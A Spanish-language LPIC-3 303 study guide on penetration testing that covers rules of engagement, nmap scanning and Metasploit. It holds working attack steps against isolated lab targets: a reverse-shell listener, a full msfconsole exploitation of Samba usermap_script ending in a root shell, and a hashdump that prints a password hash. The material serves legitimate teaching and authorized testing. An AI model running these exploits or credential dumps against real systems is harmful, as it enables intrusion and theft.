# Topic 335.2: Penetration Testing

> **LPIC-3 303 Security — Exam 303-300, version 3.0.0**
> Topic 335: Threats and Vulnerability Assessment · Objective 335.2 · Peso del examen: **5**
>
> **Alcance del objetivo.** Comprender el concepto y las fases de un penetration test; comprender los frameworks y las metodologías de penetration testing; dominar las técnicas y opciones de escaneo de `nmap` y usarlo para verificar la efectividad de las medidas de seguridad de red; comprender la arquitectura de Metasploit y manejar `msfconsole`; conocer el OWASP Top 10 y las herramientas comunes de penetration testing.

---

## 0. Precondición legal y operativa — la autorización es un pilar

Cada comando de este módulo es una *herramienta*, y cada herramienta aquí se ejecuta **únicamente contra sistemas que estás contractualmente autorizado a testear**. Escanear, enumerar o explotar infraestructura que no poseés o para la que no tenés permiso escrito de evaluación es un acto criminal bajo estatutos como la U.S. Computer Fraud and Abuse Act (CFAA), la UK Computer Misuse Act y legislación equivalente en la mayoría de las jurisdicciones. Un penetration test se distingue de un ataque por exactamente un artefacto: unas **Rules of Engagement (RoE)** firmadas que definen alcance, ventanas y límites.

Tratá las RoE como un contrato legible por máquina y versionado, no como un PDF que vive en la bandeja de entrada de alguien. Todo lo que está aguas abajo — alcance del escaneo, límites de tasa, clases de exploit permitidas — deriva de ellas.

```yaml
# roe.yaml — Rules of Engagement, committed alongside the engagement's tooling
engagement:
  id: PT-2026-0342
  client: acme-payments-prod
  type: gray-box            # black-box | gray-box | white-box
  authorized_by: "J. Ríos, CISO"          # named human with authority
  signed_at: "2026-08-20T09:00:00-03:00"
  contact_soc: "+54-11-5555-0100"          # who to call when a control trips
scope:
  in_scope_cidrs:
    - 203.0.113.0/28
    - 198.51.100.16/28
  in_scope_domains:
    - "*.staging.acme.example"
  out_of_scope:                            # explicit deny always wins
    - 203.0.113.1        # border router / management plane
    - "billing-db.internal.acme.example"   # PCI cardholder data store
constraints:
  test_window: "Mon-Thu 20:00-06:00 ART"   # off-peak only
  denial_of_service: forbidden             # no stress/flood/-T5 against prod
  social_engineering: forbidden
  data_exfiltration: "synthetic markers only, no real PII/PAN"
  max_scan_rate_pps: 500                    # ties directly to nmap --max-rate
  exploitation:
    allowed: true
    require_verbal_go: true                # phone SOC before any exploit module
    prohibited_modules: ["*/dos/*", "*wipe*", "*ransom*"]
deliverables:
  - executive_summary
  - technical_findings_cvss
  - remediation_guidance
  - raw_scan_artifacts        # .nmap/.gnmap/.xml, msf loot, screenshots
```

**Encuadre arquitectónico de este módulo.** Un penetration test es la *validación empírica* de todo lo que los demás temas del 303-300 construyen defensivamente — el hardening de host del 332.1, el MAC del 333.2, el packet filtering del 334.3, la VPN del 334.4. El hardening afirma que un control *existe*; un pentest prueba que *funciona contra un adversario que activamente intenta derrotarlo*. `nmap` es el instrumento elegido por el examen precisamente porque convierte "desplegamos un firewall" en una medición falsable: qué puertos están `open`, cuáles `filtered` y — de modo crítico — si esos dos coinciden con la política `iptables`/`nftables` prevista.

---

## 1. El problema de producción: controles asumidos vs. controles probados

Los equipos de plataforma acumulan controles de seguridad del mismo modo que acumulan infraestructura — de forma incremental, bajo deadline y rara vez re-validados tras el despliegue inicial. Considerá un escenario de drift típico en un patrimonio de servicios fronteado por Kubernetes:

- Se escribió una `NetworkPolicy` para aislar el namespace de pagos, pero un `kubectl apply` posterior de un pod de "debug" agregó un `NodePort` que abre un agujero directo hasta un backend en la IP externa de cada nodo.
- Un ruleset de `nftables` en el bastión se editó a mano durante un incidente a las 03:00; la regla `accept` temporal para el puerto 6443 nunca se removió.
- Una imagen de contenedor pineó `openssl 3.0.2` hace dieciocho meses; el pipeline de rebuild de la imagen base se rompió silenciosamente, así que "parcheamos mensualmente" ahora es ficción.

Ninguno de estos aparece en una revisión de configuración que lee el estado *previsto* (los manifiestos committeados en Git). Aparecen solo cuando algo en el cable enumera la superficie realmente expuesta desde el punto de vista del atacante. Ese es el rol arquitectónico del penetration testing: **mide la superficie de ataque emergente y real, que casi nunca es idéntica a la declarada.**

### 1.1 Tres actividades distintas que frecuentemente se confunden

| Actividad | Pregunta que responde | Profundidad | ¿Explotación? | Cadencia típica | Salida |
|---|---|---|---|---|---|
| **Vulnerability assessment** | "¿Qué debilidades *conocidas* existen?" | Amplia, superficial, automatizada | No — solo detección | Continua / semanal | Lista priorizada de CVE (CVSS) |
| **Penetration test** | "¿Puede un atacante realmente *encadenar* debilidades para alcanzar un objetivo?" | Estrecha, profunda, dirigida por humanos | Sí — prueba el impacto | Trimestral / por release | Narrativa de ataque + PoC + riesgo de negocio |
| **Red team engagement** | "¿Nuestra *detección y respuesta* atraparía a un adversario real?" | Basada en objetivos, sigilosa | Sí — más evasión del blue team | Anual | Línea de tiempo de TTP vs. detecciones del SOC |

El objetivo de examen 335.2 se sitúa en la fila del **penetration test**. El vulnerability assessment (scanners) es una *fase dentro de* él, y se requiere conocimiento del encuadre de red team (ATT&CK), pero la competencia central es escaneo con alcance + verificación + explotación controlada.

### 1.2 Las fases de un penetration test

El ciclo de vida canónico — alineá cada fase con su herramienta dominante:

```
┌─────────────────┐   ┌──────────────┐   ┌───────────────┐   ┌──────────────┐
│ 1. Pre-engage-  │   │ 2. Recon /   │   │ 3. Scanning / │   │ 4. Exploit-  │
│    ment & RoE   │──▶│  Intelligence│──▶│  Enumeration  │──▶│    ation     │──┐
│ (scope, legal)  │   │ (OSINT, DNS) │   │ (nmap, NSE)   │   │ (msf, PoC)   │  │
└─────────────────┘   └──────────────┘   └───────────────┘   └──────────────┘  │
        ▲                                                                        │
        │             ┌──────────────┐   ┌───────────────┐   ┌──────────────┐  │
        └─────────────│ 7. Reporting │◀──│ 6. Post-      │◀──│ 5. Privilege │◀─┘
          feedback    │  & retest    │   │  exploitation │   │  escalation  │
                      └──────────────┘   │  (loot, pivot)│   │  & lateral   │
                                         └───────────────┘   └──────────────┘
```

- **Reconnaissance** es *pasivo* (OSINT, DNS, cert transparency, `theHarvester`, `amass`) — sin paquetes hacia el objetivo — frente a **scanning**, que es *activo* (paquetes en el cable, `nmap`). La distinción pasivo/activo es una trampa frecuente del examen.
- **Enumeration** extrae detalles: nombres de usuario, shares, versiones de software, endpoints — la materia prima para hacer coincidir exploits.
- **Exploitation** es la única fase gateada tras un go verbal en unas RoE maduras, porque es la única fase que cambia el estado del objetivo.
- **Post-exploitation** responde "¿y entonces qué?" — qué datos, qué alcance lateral, qué persistencia obtendría un atacante real.
- **Reporting** es el entregable que el cliente paga. Un hallazgo sin pasos de reproducción ni riesgo anclado a CVSS no vale nada.

---

## 2. Metodologías y frameworks

Los frameworks le dan al engagement estructura, repetibilidad y defensibilidad ("seguimos NIST 800-115" es un activo legal y de auditoría). El examen espera conocimiento de los principales y de sus diferencias.

| Framework | Owner | Dominio primario | Fortaleza | Mejor uso |
|---|---|---|---|---|
| **PTES** (Penetration Testing Execution Standard) | Community | Ciclo de vida de pentest de extremo a extremo | Define las siete fases usadas en toda la industria; se combina con una Technical Guidelines companion | Estructurar un engagement comercial completo |
| **NIST SP 800-115** | NIST (US gov) | Testing y evaluación técnica de seguridad | Autoritativo, citable en contextos de compliance (FedRAMP, FISMA) | Entornos regulados/gubernamentales |
| **OSSTMM** (Open Source Security Testing Methodology Manual) | ISECOM | Medición de seguridad operativa | Orientado a métricas (score "RAV"); testea confianza/controles cuantitativamente | Testing repetible, medible, de calidad de auditoría |
| **OWASP WSTG** (Web Security Testing Guide) | OWASP | Testing de aplicaciones web | Casos de test exhaustivos por vulnerabilidad (WSTG-*) | Engagements de la capa de aplicación |
| **OWASP Top 10** | OWASP | *Concienciación* de riesgos web | Consenso de los riesgos web más críticos; no es una metodología | Priorización, educación de desarrolladores, lenguaje de reporting |
| **MITRE ATT&CK** | MITRE | Base de conocimiento de TTP de adversarios | Mapea técnicas a threat actors reales; lenguaje común entre red y blue | Red teaming, mapeo de detección, reporte de TTP |
| **Cyber Kill Chain** | Lockheed Martin | Modelo de fases de intrusión | Narrativa simple de 7 etapas (recon→actions on objectives) | Storytelling de ataque a nivel ejecutivo |

**Cómo se componen en la práctica:** *scopeás y estructurás* con PTES o NIST 800-115, *ejecutás trabajo web* contra los casos de test de WSTG, *hablás de riesgo* en términos de Top 10 / CVSS, y *describís el comportamiento del adversario* en IDs de técnica de ATT&CK (p. ej., `T1046 Network Service Discovery` es literalmente lo que hace `nmap`; `T1210 Exploitation of Remote Services` es lo que hace un módulo de exploit de Metasploit). Este mapeo es lo que permite a un blue team verificar sus detecciones contra tu reporte línea por línea.

---

## 3. Lab reproducible: el rango objetivo y la plataforma atacante

Nunca aprendés la semántica de estados de `nmap` ni el staging de payloads de Metasploit leyendo — lo aprendés observando paquetes contra objetivos con vulnerabilidades conocidas en una red **aislada**. Lo que sigue es un lab autocontenido y descartable. Está deliberadamente construido sobre una red Docker `internal` con **sin ruta por defecto hacia el host o internet desde los objetivos vulnerables**, de modo que el software intencionalmente roto nunca pueda alcanzarse desde afuera.

```yaml
# docker-compose.yml — isolated pentest lab. NEVER expose these ports publicly.
name: pentest-lab

networks:
  range:
    driver: bridge
    internal: true          # <-- no NAT to the outside world for targets
    ipam:
      config:
        - subnet: 172.30.0.0/24

services:
  # ---------- Attacker workstation ----------
  attacker:
    image: kalilinux/kali-rolling:latest
    container_name: kali-attacker
    cap_add:
      - NET_RAW              # required for -sS/-sU raw-socket scans
      - NET_ADMIN
    networks:
      range:
        ipv4_address: 172.30.0.10
    command: >
      bash -c "apt-get update &&
               apt-get install -y nmap ncat metasploit-framework nikto
                                  hydra sqlmap gobuster whatweb dnsutils &&
               tail -f /dev/null"
    tty: true
    stdin_open: true

  # ---------- Vulnerable target: classic multi-service host ----------
  metasploitable:
    image: tleemcjr/metasploitable2:latest   # community image; SSH/FTP/SMB/HTTP/MySQL
    container_name: target-meta2
    networks:
      range:
        ipv4_address: 172.30.0.20

  # ---------- Vulnerable target: web app (DVWA) ----------
  dvwa:
    image: vulnerables/web-dvwa:latest
    container_name: target-dvwa
    networks:
      range:
        ipv4_address: 172.30.0.30

  # ---------- Vulnerable target: modern web app (OWASP Juice Shop) ----------
  juiceshop:
    image: bkimminich/juice-shop:latest
    container_name: target-juice
    environment:
      - NODE_ENV=unsafe
    networks:
      range:
        ipv4_address: 172.30.0.40
```

Levantalo y entrá al atacante:

```bash
$ docker compose up -d
[+] Running 5/5
 ✔ Network pentest-lab_range         Created                              0.1s
 ✔ Container kali-attacker           Started                              1.2s
 ✔ Container target-meta2            Started                              1.1s
 ✔ Container target-dvwa             Started                              1.0s
 ✔ Container target-juice            Started                              1.3s

$ docker exec -it kali-attacker bash
┌──(root㉿kali-attacker)-[/]
└─# ip -4 addr show eth0 | awk '/inet/{print $2}'
172.30.0.10/24
```

> **Chequeo de aislamiento.** Desde `attacker`, `ping 8.8.8.8` debe fallar para que la intención de la subred de los contenedores *objetivo* se sostenga; el contenedor atacante mismo está en la misma red `internal`, así que también carece de egress. Si necesitás paquetes, instalalos en build time o adjuntá una segunda red no-internal solo a `attacker`. Nunca adjuntes los contenedores vulnerables a una red enrutable.

---

## 4. `nmap` — el instrumento central del 335.2

`nmap` es la utilidad con mayor peso individual en este objetivo. Debés comprender *qué paquetes envía cada tipo de escaneo, qué respuesta mapea a qué estado de puerto, y por qué se reporta un estado dado.* Verificar "la efectividad de las medidas de seguridad de red" significa leer estos estados contra la política de firewall prevista.

### 4.1 Host discovery (¿están siquiera arriba los hosts?)

```bash
# -sn = "no port scan" — host discovery only (the modern name for old -sP)
┌──(root㉿kali-attacker)-[/]
└─# nmap -sn 172.30.0.0/24
Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-25 22:14 UTC
Nmap scan report for target-meta2 (172.30.0.20)
Host is up (0.000098s latency).
MAC Address: 02:42:AC:1E:00:14 (Unknown)
Nmap scan report for target-dvwa (172.30.0.30)
Host is up (0.000085s latency).
MAC Address: 02:42:AC:1E:00:1E (Unknown)
Nmap scan report for target-juice (172.30.0.40)
Host is up (0.00011s latency).
Nmap scan report for kali-attacker (172.30.0.10)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.19 seconds
```

Dos opciones de host discovery importan para la verificación de controles porque los firewalls rutinariamente descartan las probes en las que se basa el discovery:

- **`-Pn`** — *saltear host discovery por completo; tratar cada host como arriba.* Usá esto cuando un firewall descarta ICMP y el ping sweep por defecto concluye erróneamente "host down", causando que `nmap` saltee el port scan. Esta es la causa más común de falso negativo en engagements reales.
- **`-PS`/`-PA`/`-PU`/`-PE`** — probes de discovery TCP SYN / TCP ACK / UDP / ICMP-echo; elegí la que el firewall del objetivo *no* descarta.

### 4.2 Tipos de escaneo — paquetes enviados y estados inferidos

| Flag | Nombre | Privilegio | Paquete enviado | Respuesta → estado | Notas |
|---|---|---|---|---|---|
| `-sS` | TCP SYN ("half-open") | **root** (raw sockets) | `SYN` | `SYN/ACK`→open · `RST`→closed · none/ICMP-unreach→filtered | Por defecto cuando root; rápido, nunca completa el handshake |
| `-sT` | TCP connect | cualquier usuario | 3 vías completo vía `connect()` | OS reporta éxito→open · refused→closed · timeout→filtered | Usado cuando no hay privilegio de raw-socket; ruidoso (logueado por las apps del objetivo) |
| `-sU` | UDP | **root** | datagrama UDP vacío (o payload de protocolo) | respuesta UDP→open · ICMP port-unreach→closed · none→`open|filtered` | Lento; el rate-limiting de ICMP lo lisia |
| `-sA` | TCP ACK | **root** | `ACK` | `RST`→unfiltered · none/ICMP→filtered | Mapea *reglas de firewall*, no puertos abiertos — te dice stateful vs. stateless |
| `-sN`/`-sF`/`-sX` | Null / FIN / Xmas | **root** | flags: none / FIN / FIN+PSH+URG | none→`open|filtered` · `RST`→closed | Explota el RFC 793; bypassa algunos filtros stateless; inútil vs. Windows |
| `-sW` | TCP Window | **root** | `ACK` (lee el window size del RST) | window no-cero→open | Raro; se apoya en peculiaridades de stacks viejos |
| `-sn` | (sin port scan) | cualquiera | solo probes de discovery | — | Solo host discovery |

**Leer estos para verificación de controles** es el punto entero del objetivo. El escaneo `-sA` (ACK) es el favorito del arquitecto de plataforma porque responde directamente *"¿es stateful mi firewall?"*: un packet filter stateless que solo bloquea SYN entrantes dejará pasar un ACK no solicitado y responderá `RST` (reportado `unfiltered`), mientras que un firewall stateful descarta el ACK fuera de estado (reportado `filtered`). Esa diferencia es invisible para un SYN scan.

### 4.3 Estados de puerto — el vocabulario de la medición

| Estado | Significado | Qué te dice sobre el control |
|---|---|---|
| `open` | Una aplicación está aceptando conexiones activamente | Superficie expuesta — ¿se *supone* que lo esté? |
| `closed` | Host alcanzable, el puerto responde `RST`, nada escuchando | El host está arriba; ningún firewall descartando este puerto |
| `filtered` | Sin respuesta / ICMP unreachable — un packet filter lo descartó | **Un firewall está haciendo su trabajo aquí** (o un falso negativo) |
| `unfiltered` | Alcanzable pero estado indeterminado (solo ACK scan) | El firewall es stateless para este puerto |
| `open|filtered` | No se puede distinguir open de filtered (sin respuesta — UDP/FIN/Null/Xmas) | Ambiguo; sondeá más hondo con `-sV` |
| `closed|filtered` | No se puede distinguir closed de filtered (solo Idle scan) | Raro |

La distinción entre `closed` y `filtered` **es** la medición de efectividad: un host endurecido debería presentar `filtered` para todo salvo sus puertos de servicio previstos y `closed` para nada externamente. Un muro de `closed` significa que el host está expuesto sin ningún packet filter delante.

### 4.4 Un escaneo de calidad de producción y su salida

```bash
┌──(root㉿kali-attacker)-[/]
└─# nmap -sS -sV -O -p- --reason -T4 -oA scans/meta2_full 172.30.0.20
Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-25 22:20 UTC
Nmap scan report for target-meta2 (172.30.0.20)
Host is up, received arp-response (0.000090s latency).
Not shown: 65505 closed tcp ports (reset)
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 64 vsftpd 2.3.4
22/tcp   open  ssh         syn-ack ttl 64 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      syn-ack ttl 64 Linux telnetd
25/tcp   open  smtp        syn-ack ttl 64 Postfix smtpd
80/tcp   open  http        syn-ack ttl 64 Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 3.0.20-Debian
3306/tcp open  mysql       syn-ack ttl 64 MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  syn-ack ttl 64 PostgreSQL DB 8.3.0 - 8.3.7
MAC Address: 02:42:AC:1E:00:14 (Unknown)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop

Service Info: Host: metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 scanned) in 18.44 seconds
```

Flag por flag, y por qué está cada uno:

| Flag | Función | Razonamiento de producción |
|---|---|---|
| `-sS` | SYN scan | Rápido, half-open; por defecto bajo root |
| `-sV` | Version detection | Convierte "puerto 21 open" en "vsftpd 2.3.4" — la versión es lo que matcheás contra CVEs |
| `-O` | OS detection | Fingerprint del stack TCP/IP; guía la selección de exploit/OS |
| `-p-` | Los 65535 puertos TCP | Nunca confíes en los top-1000 por defecto; el servicio interesante siempre está en 8443/6443/9200 |
| `--reason` | Muestra *por qué* se asignó un estado | El flag de diagnóstico más valioso — ver §9 |
| `-T4` | Plantilla de timing "aggressive" | Rápido en LAN/lab; **usá `-T2` o `--max-rate` contra prod** (límite de RoE) |
| `-oA scans/meta2_full` | Salida en los 3 formatos | `.nmap` (humano), `.gnmap` (grep), `.xml` (import a Metasploit/reporting) |

`vsftpd 2.3.4` en esa salida es un ejemplo de manual de la medición dando frutos: esa versión exacta se embarcó con un backdoor (el trigger de la carita `:)`). La version detection *es* el hallazgo.

### 4.5 Control de timing y tasa (los diales críticos para las RoE)

| Plantilla | Nombre | Comportamiento | Cuándo |
|---|---|---|---|
| `-T0` | paranoid | Espaciado de probes de 5 min, serial | Evasión de IDS, sigilo extremo |
| `-T1` | sneaky | Espaciado de 15 seg | Lento, poco ruido |
| `-T2` | polite | Reduce el ancho de banda a la mitad, espacia probes | **Sistemas prod frágiles** |
| `-T3` | normal | Por defecto | Uso general |
| `-T4` | aggressive | Rápido, asume una red confiable | LAN/lab, objetivos robustos |
| `-T5` | insane | Sacrifica precisión por velocidad | Solo cuando podés tolerar `filtered` falsos |

Para control fino alineado con `max_scan_rate_pps` en las RoE:

```bash
# Cap outbound to 500 packets/sec to honour the RoE and avoid tripping rate-based IDS
└─# nmap -sS -p- --max-rate 500 --min-rate 100 --max-retries 2 \
        --host-timeout 30m -T2 203.0.113.0/28
```

> **Trampa:** `-T5` y un `--min-rate` demasiado agresivo hacen que se descarten paquetes en tránsito, lo que `nmap` reporta como `filtered`. Entonces concluís "el firewall lo bloquea" cuando en realidad *vos* saturaste el enlace. El timing agresivo fabrica falsos positivos sobre la efectividad de los controles.

### 4.6 El Nmap Scripting Engine (NSE)

NSE (`--script`) es donde `nmap` deja de ser un port scanner y se vuelve una plataforma de detección de vulnerabilidades y enumeración. Los scripts son Lua, agrupados en categorías.

| Categoría | Propósito | ¿Seguro contra prod? |
|---|---|---|
| `safe` | No crashea/explota el objetivo | ✅ |
| `default` (`-sC`) | Corre con verbosidad normal; ampliamente seguro | ✅ |
| `discovery` | Enumera más sobre el objetivo | ✅ (mayormente) |
| `version` | Asiste a `-sV` | ✅ |
| `auth` | Bypassea/enumera autenticación | ⚠️ |
| `vuln` | Chequea vulnerabilidades conocidas | ⚠️ sondea bugs reales |
| `brute` | Brute-forcing de credenciales | ⚠️ ruidoso, puede bloquear cuentas |
| `intrusive` | Puede crashear servicios o quedar logueado | ⚠️ gateado por RoE |
| `exploit` | Explota activamente | ⛔ tratar como fase de explotación |
| `dos` | Denial of service | ⛔ RoE `forbidden` |

```bash
# SMB vulnerability sweep — 'vuln' category is intrusive: RoE go required
└─# nmap -p445 --script "smb-vuln-*" --script-args=unsafe=0 172.30.0.20
Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-25 22:31 UTC
Nmap scan report for target-meta2 (172.30.0.20)
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|_    Risk factor: HIGH
| smb-vuln-cve-2017-7494:
|   VULNERABLE:
|   SAMBA Remote Code Execution from Writable Share (CVE-2017-7494 / SambaCry)
|     State: VULNERABLE
|     Risk factor: HIGH  CVSSv3: 7.5
|_    References: https://www.samba.org/samba/security/CVE-2017-7494.html

Nmap done: 1 IP address (1 host up) scanned in 3.02 seconds
```

Scripts de enumeración comunes que deberías reconocer: `http-title`, `http-enum`, `http-headers`, `ssl-cert`, `ssl-enum-ciphers` (¡valida la postura TLS del 334.4/331.x!), `ssh2-enum-algos`, `smb-os-discovery`, `smb-enum-shares`, `dns-brute`, `banner`. Mantené actualizada la DB de scripts local con `nmap --script-updatedb`.

### 4.7 `masscan` — cuando la superficie es de escala /16

`nmap` es exhaustivo pero no el scanner asíncrono más rápido. Para descubrimiento de superficie a escala de internet, `masscan` transmite a line rate; luego alimentás sus hallazgos de vuelta a `nmap -sV` para un fingerprinting preciso.

```bash
# masscan finds open ports fast (async, no handshake tracking)...
└─# masscan 203.0.113.0/24 -p1-65535 --rate 1000 -oL masscan.txt
# ...then nmap does deep inspection on ONLY the ports masscan found open
└─# nmap -sV -sC -p$(awk '/open/{print $3}' masscan.txt | paste -sd,) 203.0.113.5
```

---

## 5. Enumeración con resultados de `nmap` + `ncat`

`ncat` (la reescritura del clásico netcat por el proyecto Nmap, con soporte TLS/proxy) es la herramienta nombrada por el examen para banner-grabbing e interacción manual.

```bash
# Manual banner grab — confirm the service nmap fingerprinted
└─# ncat 172.30.0.20 21
220 (vsFTPd 2.3.4)
^C

# Test whether a port truly speaks HTTP (control verification, not just "open")
└─# printf 'HEAD / HTTP/1.0\r\n\r\n' | ncat 172.30.0.30 80
HTTP/1.1 302 Found
Date: Tue, 25 Aug 2026 22:40:11 GMT
Server: Apache/2.4.25 (Debian)
Location: login.php
X-Frame-Options: SAMEORIGIN

# ncat as a listener (the receiving end of a reverse shell — see §6.4)
└─# ncat -lvnp 4444
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on 0.0.0.0:4444
```

`ncat` vs. el `nc` legacy: `ncat` agrega `--ssl`, `--proxy`, connection brokering (`--broker`) y control de acceso (`--allow`), y **no** embarca por defecto el `-e`/`--exec` "GAPING_SECURITY_HOLE" del netcat tradicional — tenés que pasar `-e`/`-c` explícitamente. Conocé esa distinción.

---

## 6. Metasploit Framework — arquitectura y `msfconsole`

Metasploit es el framework de explotación nombrado por el examen. Debés comprender su **arquitectura**, la taxonomía de módulos, el modelo de payloads (staged vs. stageless, reverse vs. bind) y cómo manejar `msfconsole`.

### 6.1 Arquitectura

```
                          ┌────────────────────────────────────────┐
                          │        User interfaces                  │
                          │  msfconsole · msfvenom · RPC · msgrpc   │
                          └───────────────────┬────────────────────┘
                                              │
        ┌─────────────────────────────────────┴──────────────────────────┐
        │                 Metasploit Framework core (Ruby)                 │
        │   session mgr · module mgr · event subsystem · datastore        │
        └───────┬───────────────┬───────────────┬──────────────┬─────────┘
                │               │               │              │
        ┌───────▼──────┐ ┌──────▼──────┐ ┌──────▼─────┐ ┌──────▼───────┐
        │  PostgreSQL  │ │   REX lib   │ │  Modules   │ │  Plugins     │
        │ (workspaces, │ │ (sockets,   │ │ (see 6.2)  │ │ (nessus, etc)│
        │  hosts,creds,│ │  protocols) │ │            │ │              │
        │  loot, notes)│ └─────────────┘ └────────────┘ └──────────────┘
        └──────────────┘
```

El backing store de **PostgreSQL** es lo que hace de Metasploit una *plataforma de engagement* en lugar de un lanzador de exploits: persiste hosts, servicios, credenciales y loot por **workspace**, y te permite importar el XML de `nmap` directamente (`db_import` / `db_nmap`).

### 6.2 Taxonomía de módulos

| Tipo de módulo | Propósito | Ejemplo |
|---|---|---|
| `exploit` | Código que dispara una vulnerabilidad para entregar un payload | `exploit/multi/samba/usermap_script` |
| `payload` | Código que corre *en el objetivo* tras la explotación | `linux/x86/meterpreter/reverse_tcp` |
| `auxiliary` | Scanners, fuzzers, sniffers, DoS — sin payload | `auxiliary/scanner/smb/smb_version` |
| `post` | Post-explotación sobre una sesión existente | `post/linux/gather/hashdump` |
| `encoder` | Re-codifica payloads (compatibilidad, *no* verdadero bypass de AV) | `x86/shikata_ga_nai` |
| `nop` | Generadores de NOP sled | `x86/single_byte` |
| `evasion` | Evasión de AV/EDR de propósito específico | `windows/windows_defender_exe` |

### 6.3 Modelo de payloads — el concepto más frecuentemente malentendido

**Staged vs. stageless** (leé el delimitador en el nombre):

| | Staged (separadores `/`) | Stageless (separador `_`) |
|---|---|---|
| Patrón de nombre | `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` |
| Cómo funciona | Un **stager** pequeño aterriza primero, jala el **stage** grande (meterpreter) por la red | Payload completo entregado de una sola vez |
| Tamaño en disco/cable | Stager diminuto | Blob único grande |
| ¿Necesita el handler arriba primero? | Sí — el stage se trae del handler | Sí (para el connect-back) |
| Frágil sobre enlaces con pérdida | Sí (la transferencia del stage puede fallar) | Más robusto |
| Usar cuando | Buffer de exploit con espacio limitado | Dropear un archivo standalone, red inestable |

**Reverse vs. bind:**

| | Reverse (`reverse_tcp`) | Bind (`bind_tcp`) |
|---|---|---|
| Quién inicia | **Objetivo → atacante** (llama a casa) | **Atacante → objetivo** (conecta hacia adentro) |
| Vence el firewall/NAT de ingress del objetivo | ✅ (el egress suele estar abierto) | ❌ (necesita un puerto inbound abierto en el objetivo) |
| Vence que el atacante esté detrás de NAT | ❌ (el atacante debe ser alcanzable) | ✅ |
| Elección por defecto | Reverse — el egress filtering es más raro que el de ingress | Bind solo cuando el egress está totalmente cerrado |

`LHOST`/`LPORT` (el listener del atacante) aplican a los payloads reverse; `RHOST`/`RPORT` (el objetivo) aplican a los payloads bind y a la selección de target del exploit.

### 6.4 Una sesión completa de engagement en `msfconsole`

```bash
┌──(root㉿kali-attacker)-[/]
└─# msfdb init            # initialize the PostgreSQL backing store (once)
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf' / 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema

└─# msfconsole -q         # -q suppresses the banner
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.

msf6 > workspace -a PT-2026-0342          # per-engagement isolation
[*] Added workspace: PT-2026-0342
[*] Workspace: PT-2026-0342

msf6 > db_nmap -sS -sV -p- 172.30.0.20    # scan AND persist to the DB
[*] Nmap: Starting Nmap 7.94 ( https://nmap.org )
[*] Nmap: 445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
[*] Nmap: 3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 20.11 seconds

msf6 > hosts                               # what's now in the workspace
Hosts
=====
address       mac                name          os_name  os_flavor  purpose  info
-------       ---                ----          -------   ---------  -------  ----
172.30.0.20   02:42:ac:1e:00:14  target-meta2  Linux                server

msf6 > search samba usermap
Matching Modules
================
   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script      2007-05-14       excellent  No     Samba "username map script" Command Execution

msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > info

       Name: Samba "username map script" Command Execution
     Rank: Excellent
  Platform: Unix
This module exploits a command execution vulnerability in Samba versions
3.0.20 through 3.0.25rc3 when using the non-default "username map script"
configuration option (CVE-2007-2447).

msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):
   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s)
   RPORT   139              yes       The target port (TCP)

Payload options (cmd/unix/reverse_netcat):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address
   LPORT  4444             yes       The listen port

msf6 exploit(multi/samba/usermap_script) > set RHOSTS 172.30.0.20
RHOSTS => 172.30.0.20
msf6 exploit(multi/samba/usermap_script) > set LHOST 172.30.0.10
LHOST => 172.30.0.10
msf6 exploit(multi/samba/usermap_script) > check
[*] 172.30.0.20:139 - This module does not support check.

msf6 exploit(multi/samba/usermap_script) > exploit
[*] Started reverse TCP handler on 172.30.0.10:4444
[*] Command shell session 1 opened (172.30.0.10:4444 -> 172.30.0.20:38091)

id
uid=0(root) gid=0(root)
hostname
metasploitable
```

Verbos clave de `msfconsole` que hay que saber de memoria: `search`, `use`, `info`, `show options`, `show payloads`, `set`/`setg` (global), `unset`, `check` (verificación no destructiva), `exploit`/`run`, `background`, `sessions -l`, `sessions -i <id>`.

### 6.5 Una sesión de meterpreter y post-explotación

```bash
msf6 exploit(...) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer     : 172.30.0.20
OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture : i686
Meterpreter  : x86/linux

meterpreter > getuid
Server username: root

meterpreter > ps               # process list (for migration targets)
meterpreter > background       # keep session, return to msf prompt
[*] Backgrounding session 1...

msf6 > use post/linux/gather/hashdump
msf6 post(linux/gather/hashdump) > set SESSION 1
msf6 post(linux/gather/hashdump) > run
[+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
